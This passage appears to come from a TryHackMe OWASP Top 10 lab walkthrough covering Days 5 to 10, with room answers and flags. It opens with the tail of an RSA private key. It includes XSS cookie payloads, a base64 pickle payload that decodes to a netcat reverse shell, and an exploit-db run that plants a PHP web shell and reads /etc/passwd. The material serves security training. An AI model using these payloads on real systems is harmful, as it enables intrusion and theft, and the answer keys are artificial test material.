faKF5VknsONM9DC3ZNx5L1zQXbsIrWbEPsRlytECgYB7CXr/IZwLfeqUfu7yoq3R
sJKtbhYf+S4hhTPcOCQd13e8n10/HZg0CzXpZbGieusQ3lIml9Ouusp8ML0Y3aIe
f9pmP+UKnEdqUMMLg/RhowHRlD9qm0F4lf1CbQh/NK01I5ore6SPUM7fqWv4UWDr
wZzIfad/RbWxQooYtYXvUQKBgFDLcBIdpYX1x16aX1AfqLMWgRSrQqNj9UXmQa0g
83OvXmGdkbQoUfjjz1I/i10x00cycxjqpfn9htIIptG7J6i92SnTj0Vl9eTOQ1qz
N9y5qVhcURHrVh0+vy3LzNACv73y5gDw2L7PJoo0GYODn8j4eAFZJpg3qlQpovTw
HtOxAoGABqwywFKFNTYgrl17Rs4g3H1nc0EhOzGetRaRL2bcvQsZevuWyswp0Mbm
9nlgNAtxttsmfL+OU7nP3I4YQlyZed4luRWcRaXrvGMqfEL4wzRez5ZxMnZM/IlQ
9DBlD9C7t5MI3aXR3A5zFVVINomwHH7aGfeha1JRXXAtasLTVvA=
-----END RSA PRIVATE KEY-----
```

`MIIEogIBAAKCAQEA7b`

## [Day 5] Broken Access Control

![](https://i.imgur.com/fNlDFTR.png)

Websites have pages that are protected from regular visitors, for example only the site's admin user should be able to access a page to manage other users. If a website visitor is able to access the protected page/pages that they are not authorised to view, the access controls are broken.

A regular visitor being able to access protected pages, can lead to the following:

- Being able to view sensitive information
- Accessing unauthorized functionality

OWASP have a listed a few attack scenarios demonstrating access control weaknesses:

**Scenario #1:** The application uses unverified data in a SQL call that is accessing account information:

```php
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );
```

An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.

`http://example.com/app/accountInfo?acct=notmyacct`

**Scenario #2:** An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.

`http://example.com/app/getappInfo`

`http://example.com/app/admin_getappInfo`

If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw ([reference to scenarios](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control)).

To put simply, broken access control allows attackers to bypass authorization which can allow them to view sensitive data or perform tasks as if they were a privileged user.

1. Read and understand how broken access control works.

## [Day 5] Broken Access Control (IDOR Challenge)

![](https://i.imgur.com/v7GuE3d.png)

IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this `https://example.com/bank?account_number=1234`. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.

There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.

1. Read and understand how IDOR works.

`No answer needed`

2. Deploy the machine and go to http://MACHINE_IP - Login with the username being `noot` and the password `test1234`.

`No answer needed`

1. Look at other users notes. What is the flag?

- [http://10.10.238.227/note.php?note=0](http://10.10.238.227/note.php?note=0)

`flag{fivefourthree} `

## [Day 6] Security Misconfiguration

**Security Misconfiguration**

Security Misconfigurations are distinct from the other Top 10 vulnerabilities, because they occur when security could have been configured properly but was not.

Security misconfigurations include:

- Poorly configured permissions on cloud services, like S3 buckets
- Having unnecessary features enabled, like services, pages, accounts or privileges
- Default accounts with unchanged passwords
- Error messages that are overly detailed and allow an attacker to find out more about the system
- Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/), or revealing too much detail in the Server: HTTP header

This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XXE or command injection on admin pages.

For more info, I recommend having a look at the [OWASP top 10 entry for Security Misconfiguration](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration)

**Default Passwords**

Specifically, this VM focusses on default passwords. These are a specific example of a security misconfiguration. You could, and should, change any default passwords but people often don't.

It's particularly common in embedded and Internet of Things devices, and much of the time the owners don't change these passwords.

It's easy to imagine the risk of default credentials from an attacker's point of view. Being able to gain access to admin dashboards, services designed for system administrators or manufacturers, or even network infrastructure could be incredibly useful in attacking a business. From data exposure to easy RCE, the effects of default credentials can be severe.

In October 2016, Dyn (a DNS provider) was taken offline by one of the most memorable DDoS attacks of the past 10 years. The flood of traffic came mostly from Internet of Things and networking devices like routers and modems, infected by the Mirai malware.

How did the malware take over the systems? Default passwords. The malware had a list of 63 username/password pairs, and attempted to log in to exposed telnet services.

The DDoS attack was notable because it took many large websites and services offline. Amazon, Twitter, Netflix, GitHub, Xbox Live, PlayStation Network, and many more services went offline for several hours in 3 waves of DDoS attacks on Dyn.

**Practical example**

This VM showcases a `Security Misconfiguration`, as part of the OWASP Top 10 Vulnerabilities list.

Deploy the VM, and hack in by exploiting the Security Misconfiguration!

1. Deploy the VM

`No answer needed`

2. Hack into the webapp, and find the flag!

![](2020-09-26_21-16.png)

- [Using PensiveNotes](https://github.com/NinjaJc01/PensiveNotes#using-pensivenotes)

`pensive:PensiveNotes`

![](2020-09-26_21-17.png)

`thm{4b9513968fd564a87b28aa1f9d672e17}`

## [Day 7] Cross-site Scripting

**XSS Explained**

Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.

A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:

1. **Stored XSS** - the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
2. **Reflected XSS** - the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
3. **DOM-Based XSS** - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.

For more XSS explanations and exercises, check out the [XSS room](https://tryhackme.com/room/xss).

**XSS Payloads**

Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious Javascript on a victim’s machine. Check out some common payloads types used:

- Popup's (`<script>alert(“Hello World”)</script>`) - Creates a Hello World message popup on a users browser.
- Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
- [XSS Keylogger](http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
- [Port scanning](http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).

[XSS-Payloads.com](http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.

**XSS Challenge**

The VM attached to this task showcases DOM-Based, Reflected and Stored XSS. Deploy the machine and exploit each type!

1. Deploy the VM

`No answer needed`

2. Go to http://MACHINE_IP/reflected and craft a reflected XSS payload that will cause a popup saying "Hello".

`<script>alert("Hello")</script>`

`ThereIsMoreToXSSThanYouThink`

3. On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.

`<script>alert(window.location.hostname)</script>`

`ReflectiveXss4TheWin`

4. Now navigate to http://MACHINE_IP/stored and make an account. Then add a comment and see if you can insert some of your own HTML.

`<b>Hello World!</b>`

`HTML_T4gs`

5. On the same page, create an alert popup box appear on the page with your document cookies.

`<script>alert(document.cookie)</script>`

`W3LL_D0N3_LVL2`

6. Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

`<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`

`websites_can_be_easily_defaced_with_xss`

## [Day 8] Insecure Deserialization

**.:. OWASP10 - A8: Insecure Deserialisation .:.**

![](https://i.imgur.com/ReL2rEe.png)

_"Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application" (Acunetix., 2017)_

This definition is still quite broad to say the least. Simply, insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.

Specifically, this malicious code leverages the legitimate serialization and deserialization process used by web applications. We'll be explaining this process and why it is so commonplace in modern web applications.

OWASP rank this vulnerability as 8 out of 10 because of the following reasons:

- Low exploitability. This vulnerability is often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.
- The exploit is only as dangerous as the attacker's skill permits, more so, the value of the data that is exposed. For example, someone who can only cause a DoS will make the application unavailable. The business impact of this will vary on the infrastructure - some organisations will recover just fine, others, however, will not.

**.:. What's Vulnerable? .:.**

At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. A few examples of applications of this nature are:

- E-Commerce Sites
- Forums
- API's
- Application Runtimes (Tomcat, Jenkins, Jboss, etc)

1. Who developed the Tomcat application?

`The Apache Software Foundation`

2. What type of attack that crashes services can be performed with insecure deserialization?

`Denial of Service`

## [Day 8] Insecure Deserialization - Objects

**.:. Objects .:.**

A prominent element of object-oriented programming (OOP), objects are made up of two things:

- State
- Behaviour

Simply, objects allow you to create similar lines of code without having to do the leg-work of write all lines of code.

For example, a lamp would be a good object. Lamps can have different types of bulbs, this would be their state, as well as being either on/off - their behaviour!

Rather than having to accommodate every type of bulb and whether or not that specific lamp is on or off, you can use methods to simply alter the state and behaviour of the lamp.

1. Select the correct term of the following statement: if a dog was sleeping, would this be: A) A State B) A Behaviour

`A Behaviour`

## [Day 8] Insecure Deserialization - Deserialization

**.:. De(Serialization) .:.**

_Learning is best done through analogies_

A Tourist approaches you in the street asking for directions. They're looking for a local landmark and got lost. Unfortunately, English isn't their strong point and nor do you speak their dialect either. What do you do? You draw a map of the route to the landmark because pictures cross language barriers, they were able to find the landmark. Nice! You've just serialised some information, where the tourist then deserialised it to find the landmark.

**.:. Continued... .:.**

Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.

Alternatively, deserialisation is the reverse of this; converting serialised information into their complex form - an object that the application will understand.

**.:. What does this mean? .:.**

Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialised back into "password123" so it can be stored.

The process is best explained through diagrams:

![](https://i.imgur.com/ZB76mLI.png)

**.:. How can we leverage this? .:.**

Simply, insecure deserialization occurs when data from an untrusted party (I.e. a hacker) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred.

1. What is the name of the base-2 formatting that data is sent across a network as?

`Binary`

## [Day 8] Insecure Deserialization - Cookies

**.:. Cookies 101 .:.**

![](https://i.imgur.com/q8lRYI7.png)

Ah yes, the origin of many memes. Cookies are an essential tool for modern websites to function. Tiny pieces of data, these are created by a website and stored on the user's computer.

![](https://i.imgur.com/phg51EI.png)

You'll see notifications like the above on most websites these days. Websites use these cookies to store user-specific behaviours like items in their shopping cart or session IDs.

In the web application, we're going to exploit, you'll notice cookies store login information like the below! Yikes!

![](https://i.imgur.com/QhR7aOX.png)

Whilst plaintext credentials is a vulnerability in itself, it is not insecure deserialization as we have not sent any serialized data to be executed!

Cookies are not permanent storage solutions like databases. Some cookies such as session ID's will clear when the browser is closed, others, however, last considerably longer. This is determined by the "Expiry" timer that is set when the cookie is created.

Some cookies have additional attributes, a small list of these are below:

| Attribute    | Description                                                             | Required? |
| ------------ | ----------------------------------------------------------------------- | --------- |
| Cookie Name  | The Name of the Cookie to be set                                        | Yes       |
| Cookie Value | Value, this can be anything plaintext or encoded                        | Yes       |
| Secure Only  | If set, this cookie will only be set over HTTPS connections             | No        |
| Expiry       | Set a timestamp where the cookie will be removed from the browser       | No        |
| Path         | The cookie will only be sent if the specified URL is within the request | No        |

**.:. Creating Cookies .:.**

![](https://i.imgur.com/eCNHZmA.png)

Cookies can be set in various website programming languages. For example, Javascript, PHP or Python to name a few. The following web application is developed using Python's Flask, so it is fitting to use it as an example.

Take the snippet below:

![](https://i.imgur.com/9WOYwbF.png)

Setting cookies in Flask is rather trivial. Simply, this snippet gets the current date and time, stores it within the variable "timestamp" and then stores the date and time in a cookie named "registrationTimestamp". This is what it will look like in the browser.

![](https://i.imgur.com/I4oUGsn.png)

_It's as simple as that._

1. If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?

`webapp.com/login`

2. What is the acronym for the web technology that Secure cookies work over?

`https`

## [Day 8] Insecure Deserialization - Cookies Practical

.:. Accessing your Instance .:.

In the browser of the device that you are connected to the VPN with, navigate to `http://MACHINE_IP`. I will be detailing the steps for Firefox - you may have to research how to inspect cookies in the browser of your choice. You will be greeted with the home page:

![](https://i.imgur.com/K7fIW9d.png)

_Let's create an account. No need to enter your TryHackMe details, you can enter what you like._

![](https://i.imgur.com/P8o62li.png)

_Where you will be directed to your profile page. Notice on the right, you have your details._

![](https://i.imgur.com/6fYd0td.png)

Right-Click the Page and press "Inspect Element". Navigate to the "Storage" tab.

![](https://i.imgur.com/1LMFfV0.png)

**.:. Inspecting Encoded Data .:.**
You will see here that there are cookies are both plaintext encoded and base64 encoded. The first flag will be found in one of these cookies.

**.:. Modifying Cookie Values .:.**
Notice here that you have a cookie named "userType". You are currently a user, as confirmed by your information on the "myprofile" page.

This application determines what you can and cannot see by your userType. What if you wanted to be come an admin?

Double left-click the "Value" column of "userType" to modify the contents. Let's change our userType to "admin" and navigate to `http://MACHINE_IP/admin` to answer the second flag.

1. 1st flag (cookie value)

`gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAYzBiYjAwMTkyMWFiNGU2NWFkNTBkNjM2ZTY2ZDFhZDhxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==`

- [Decode from Base64 format](https://www.base64decode.org/)

`THM{good_old_base64_huh}`

2. 2nd flag (admin dashboard)

![](2020-09-26_22-01.png)

`THM{heres_the_admin_flag}`

## [Day 8] Insecure Deserialization - Remote Code Executi...

_A much more nefarious attack then simply decoding cookies, we get into the nitty-gritty._

**.:. Setup .:.**

1. First, change the value of the userType cookie from "admin" to "user" and return to `http://MACHINE_IP/myprofile`.
2. Then, left-click on the URL in "Exhange your vim" found in the screenshot below.

![](https://i.imgur.com/tdGrvcI.png)

3. Once you have done this, left-click on the URL in "Provide your feedback!" where you will be direct to page like so:

![](https://i.imgur.com/FwG0TBs.png)

**.:. What makes this form vulnerable? .:.**

If a user was to enter their feedback, the data will get encoded and sent to the Flask application (presumably for storage within a database for example). However, the application assumes that any data encoded is trustworthy. But we're hackers. You can only trust us as far as you can fling us (and that's nigh-on impossible online)

_Although explaining programming is a bit out of scope for this room, it's important to understand what's going on in the snippet below:_

![](https://i.imgur.com/lgomAL9.png)

When you visit the "Exchange your vim" URL, A cookie is encoded and stored within your browser - perfect for us to modify! Once you visit the feedback form, the value of this cookie is decoded and then deserialised. Uh oh. In the snippet below, we can see how the cookie is retrieved and then deserialized via `pickle.loads`

![](https://i.imgur.com/8id81K3.png)

This vulnerability exploits Python Pickle, which I have attached as reading material at the end of the room. We essentially have free reign to execute whatever we like such as a reverse shell.

.:. The Exploit .:.

Now I'm not going to leave you hanging dry here. First, we need to set up a netcat listener on our Kali. If you are a subscriber, you can control your own [in-browser TryHackMe Kali Machine](https://tryhackme.com/my-machine).

![](https://i.imgur.com/Ftsfnq0.png)

Because the code being deserialized is from a base64 format, we cannot just simply spawn a reverse shell. We must encode our own commands in base64 so that the malicious code will be executed. I will be detailing the steps below with provided material to do so.

Once this is complete, [copy-and-paste the source code from this Github page](https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3) to your kali and modify the source code to replace your "YOUR_TRYHACKME_VPN_IP" with your TryHackMe VPN IP. [This can be obtained via the Access page](https://tryhackme.com/access).

1. Create a python file to paste into, I have used "rce.py" for these examples:

![](https://i.imgur.com/k93pazM.png)

2. Paste the code from the GitHub site, replacing YOUR_TRYHACKME_VPN_IP with your TryHackMe VPN IP from the access page

![](https://i.imgur.com/gfR2lcf.png)

3. Execute "rce.py" via `python3 rce.py`
4. Note the output of the command, it will look something similar to this:

![](https://i.imgur.com/67OUbwN.png)

5. Copy and paste everything in-between the two speech marks ('DATA'). In my case, I will copy and paste:

`gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTEuMy4yIDQ0NDQgPiAvdG1wL2aUhZRSlC4=`

Yours may look slightly different, just ensure that you copy everything in-between the two speech marks `''`

6. Paste this into the "encodedPayload" cookie in your browser:

![](https://i.imgur.com/fZDayjD.png)

7. Ensure our netcat listener is still running:
8. Refresh the page. It will hang, refer back to your netcat listener:

![](https://i.imgur.com/WESTagT.png)

If you have performed the steps correctly, you will now have a remote shell to your instance. No privilege escalation involved, look for the flag.txt flag!

1. flag.txt

```
cat /home/cmnatic/flag.txt
```

`4a69a7ff9fd68`

## [Day 9] Components With Known Vulnerabilities - Explan...

Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well documented vulnerability.

For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on [exploit-db](https://www.exploit-db.com/exploits/41962).

As you can see this would be quite devastating, because it requires very little work on the part of the attacker as often times since the vulnerability is already well known, someone else has made an exploit for the vulnerability. The situation becomes even worse when you realize, that it's really quite easy for this to happen, if a company misses a single update for a program they use, they could be vulnerable to any number of attacks.

Hence, why OWASP has rated this a 3(meaning high) on the prevalence scale, it is incredibly easy for a company to miss an update for an application.

1. Read above.

`No answer needed`

## [Day 9] Components With Known Vulnerabilities - Exploi...

Recall that since this is about known vulnerabilities, most of the work has already been done for us. Our main job is to find out the information of the software, and research it until we can find an exploit. Let's go through that with an example web application.

![](https://i.imgur.com/bSuhuhp.png)

Nostromo 1.9.6

What do you know, this server is using the default page for the nostromo web server. Now that we have a version number and a software name, we can use [exploit-db](https://www.exploit-db.com/) to try and find an exploit for this particular version.

(Note: exploit-db is incredibly useful, and for all you beginners you're gonna be using this **a lot** so it's best to get comfortable with it)

![](https://i.imgur.com/9Wd2E4g.png)

Lucky us, the top result happens to be an exploit script. Let's download it and try and to get code execution. Running this script on it's own actually teaches us a very important lesson.

![](https://i.imgur.com/RqYyHBl.png)

It may not work the first time. It helps to have an understanding of the programming language that the script is in, so that if needed you can fix any bugs or make any modifications, as quite a few scripts on exploit-db expect you to make modifications.

![](https://i.imgur.com/Ht7uc6G.png)

Fortunately for us, the error was caused by an line that should have been commented, so it's an easy fix.

![](https://i.imgur.com/x1lHJod.png)

Fixing that, let's try and run the program again.

Boom! We have RCE. Now it's important to note here that most scripts will just tell you what arguments you need to provide, exploit developers will rarely make you read potentially hundreds of lines of codes just to figure out how to use the script.

It is also worth noting that it may not always be this easy, sometimes you will just be given a version number like in this case, but other times you may need to dig through the HTML source, or even take a lucky guess on an exploit script, but realistically if it is a known vulnerability, there's probably a way to discover what version the application is running.

That's really it, the great thing about this piece of the OWASP 10, is that the work is pretty much already done for us, we just need to do some basic research, and as a penetration tester, you're already doing that quite a bit :).

1. Read the above!

`No answer needed`

## [Day 9] Components With Known Vulnerabilities - Practi...

The following is a vulnerable application, all information you need to exploit it can be found online.

Note: When you find the exploit script, put all of your input in quotes, for example "id"

1. How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)

- [Online Book Store 1.0 - Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/47887)

```
python3 47887.py http://10.10.243.197/

> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.243.197/bootstrap/img/2s5yhbfXdq.php
> Example command usage: http://10.10.243.197/bootstrap/img/2s5yhbfXdq.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y

RCE $ wc -c /etc/passwd
1611 /etc/passwd
```

`1611`

## [Day 10] Insufficient Logging and Monitoring

When web applications are set up, every action performed by the user should be logged. Logging is important because in the event of an incident, the attackers actions can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions an attacker performed if they gain access to particular web applications. The bigger impacts of these include:

- regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, not only are users of the application affected, but the application owners may be subject to fines or more severe actions depending on regulations.
- risk of further attacks: without logging, the presence of an attacker may be undetected. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

The information stored in logs should include:

- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses

These logs do have some sensitive information on them so its important to ensure that logs are stored securely and multiple copies of these logs are stored at different locations.

As you may have noticed, logging is more important after a breach or incident has occurred. The ideal is case is having monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity includes:

- multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources e.g. admin pages)
- requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
- use of automated tools: particular automated tooling can be easily identifiable e.g. using the value of User-Agent headers or the speed of requests. This can indicate an attacker is using automated tooling.
- common payloads: in web applications, it's common for attackers to use Cross Site Scripting (XSS) payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.

Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will higher impact than others. These higher impact actions need to be responded to sooner thus they should raise an alarm which raises the attention of the relevant party.

Put this knowledge to practise by analysing this sample log file.

```
200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
```

1. What IP address is the attacker using?

```
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
```

`49.99.13.16`

2. What kind of attack is being carried out?

`Brute Force`

## What Next?

**What Next?**

Why not enroll in our [beginner level pathway](https://tryhackme.com/path/outline/beginner) or [find another room](https://tryhackme.com/hacktivities) to complete?

1. Read the above!

`No answer needed`
